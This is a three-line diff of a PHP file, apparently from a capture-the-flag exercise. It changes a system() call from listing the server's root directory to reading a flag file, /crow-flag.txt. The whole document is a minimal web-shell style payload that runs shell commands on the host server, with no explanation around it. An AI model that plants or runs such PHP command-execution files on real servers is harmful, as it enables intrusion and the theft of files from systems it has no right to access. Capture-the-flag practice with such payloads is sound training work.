@@ -1,3 +1,3 @@
 <?php
-system("ls /");
+system("cat  /crow-flag.txt");
 ?>
